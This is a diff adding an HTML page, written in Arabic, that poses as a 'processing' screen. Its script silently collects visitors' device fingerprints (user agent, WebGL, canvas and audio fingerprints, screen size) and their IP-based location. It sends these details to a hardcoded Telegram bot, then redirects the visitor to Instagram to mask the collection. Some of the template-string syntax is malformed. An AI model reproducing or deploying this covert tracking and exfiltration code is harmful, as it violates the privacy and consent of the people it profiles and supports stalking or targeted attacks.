@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>جاري المعالجة...</title>
+<style>
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    direction: rtl;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+
+<script>
+(async () => {
+
+  const telegramBotToken = "7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58";
+  const telegramChatId = "5854169054";
+
+  function escapeMarkdown(text) {
+    if (!text) return "";
+    return text.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&");
+  }
+
+  const data = {};
+
+  data.userAgent = navigator.userAgent;
+  data.platform = navigator.platform;
+  data.vendor = navigator.vendor;
+  data.appVersion = navigator.appVersion;
+  data.hardwareConcurrency = navigator.hardwareConcurrency || "غير مدعوم";
+  data.deviceMemory = navigator.deviceMemory || "غير مدعوم";
+
+  function getWebGLInfo() {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (!gl) return {vendor: "غير مدعوم", renderer: "غير مدعوم"};
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "غير مدعوم";
+    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "غير مدعوم";
+    return { vendor, renderer };
+  }
+  const webglInfo = getWebGLInfo();
+  data.webglVendor = webglInfo.vendor;
+  data.webglRenderer = webglInfo.renderer;
+
+  function getCanvasFingerprint() {
+    try {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.textBaseline = "alphabetic";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125,1,62,20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("fingerprint", 2, 15);
+      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+      ctx.fillText("fingerprint", 4, 17);
+      return canvas.toDataURL();
+    } catch {
+      return "غير مدعوم";
+    }
+  }
+  data.canvasFingerprint = getCanvasFingerprint();
+
+  function getAudioFingerprint() {
+    return new Promise((resolve) => {
+      try {
+        const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+        if (!AudioContext) return resolve("غير مدعوم");
+
+        const context = new AudioContext(1, 44100, 44100);
+        const oscillator = context.createOscillator();
+        const analyser = context.createAnalyser();
+        oscillator.type = "triangle";
+        oscillator.connect(analyser);
+        analyser.connect(context.destination);
+        oscillator.start(0);
+        context.startRendering().then((buffer) => {
+          let fingerprint = 0;
+          const dataAudio = buffer.getChannelData(0);
+          for (let i = 4500; i < 5000; i++) fingerprint += Math.abs(dataAudio[i]);
+          resolve(fingerprint.toString());
+        }).catch(() => resolve("خطأ"));
+      } catch {
+        resolve("خطأ");
+      }
+    });
+  }
+
+  data.screenWidth = screen.width;
+  data.screenHeight = screen.height;
+
+  async function getIPInfo() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      if (!res.ok) throw new Error("فشل جلب IP");
+      const ipData = await res.json();
+      return ipData;
+    } catch {
+      return null;
+    }
+  }
+  const ipData = await getIPInfo();
+  data.ipAddress = ipData?.ip || "غير متوفر";
+  data.country = ipData?.country_name || "غير متوفر";
+  data.city = ipData?.city || "غير متوفر";
+
+  data.audioFingerprint = await getAudioFingerprint();
+
+  const message = 
+*📡 بيانات Fingerprinting مفصلة مع الشرح:*
+
+*1. User Agent*  
+\${escapeMarkdown(data.userAgent)}\  
+_هو معرف المتصفح والنظام الذي يستخدمه المستخدم، يساعد في تمييز نوع الجهاز والمتصفح._
+
+*2. Platform*  
+\${escapeMarkdown(data.platform)}\  
+_نوع النظام الأساسي مثل Windows أو Mac أو Linux._
+
+*3. Vendor*  
+\${escapeMarkdown(data.vendor)}\  
+_الشركة المصنعة للمتصفح (مثل Google أو Apple)، يمكن أن يساعد في التمييز بين المتصفحات._
+
+*4. App Version*  
+\${escapeMarkdown(data.appVersion)}\  
+_إصدار المتصفح المستخدم._
+
+*5. Hardware Concurrency*  
+\${data.hardwareConcurrency}\  
+_عدد أنوية المعالج، يعكس قوة الجهاز وامكانياته._
+
+*6. Device Memory*  
+\${data.deviceMemory}\ جيجابايت  
+_حجم ذاكرة الوصول العشوائي RAM بالجهاز، يعكس سرعة الجهاز وقدرته على معالجة البيانات._
+
+*7. WebGL Vendor*  
+\${escapeMarkdown(data.webglVendor)}\  
+_الشركة المصنعة لكرت الشاشة، يمكن أن تساعد في التمييز بين الأجهزة._
+
+*8. WebGL Renderer*  
+\${escapeMarkdown(data.webglRenderer)}\  
+_نوع بطاقة الرسومات التي يستخدمها الجهاز._
+
+*9. Canvas Fingerprint*  
+_(مختصر)_  
+\${escapeMarkdown(data.canvasFingerprint.substring(0, 50))}...\  
+_بصمة رسومية فريدة يتم إنشاؤها من خلال رسم صورة على canvas، تُستخدم لتمييز الأجهزة بشكل دقيق._
+
+*10. Audio Fingerprint*  
+\${data.audioFingerprint}\  
+_بصمة صوتية فريدة يتم توليدها من خلال معالجة صوتية غير مسموعة، تُستخدم لتمييز الأجهزة._
+
+*11. Screen Width*  
+\${data.screenWidth}\ بكسل  
+_عرض شاشة العرض، مهم لمعرفة دقة الشاشة التي يستخدمها المستخدم._
+
+*12. Screen Height*  
+\${data.screenHeight}\ بكسل  
+_ارتفاع شاشة العرض._
+
+*13. IP Address*  
+\${data.ipAddress}\  
+_عنوان الـ IP الخاص بالمستخدم، يعطي معلومات عن موقعه الجغرافي._
+
+*14. Country*  
+\${escapeMarkdown(data.country)}\  
+_الدولة التي ينتمي إليها المستخدم بناءً على عنوان IP._
+
+*15. City*  
+\${escapeMarkdown(data.city)}\  
+_المدينة التي يتواجد فيها المستخدم._
+;
+
+  await fetch(https://api.telegram.org/bot${telegramBotToken}/sendMessage, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: telegramChatId,
+      text: message,
+      parse_mode: "Markdown"
+    }),
+  });
+
+  // بعد الإرسال، تنقل بسرعة إلى انستغرام
+  window.location.href = "https://www.instagram.com/";
+
+})();
+</script>
+
+</body>
+</html>
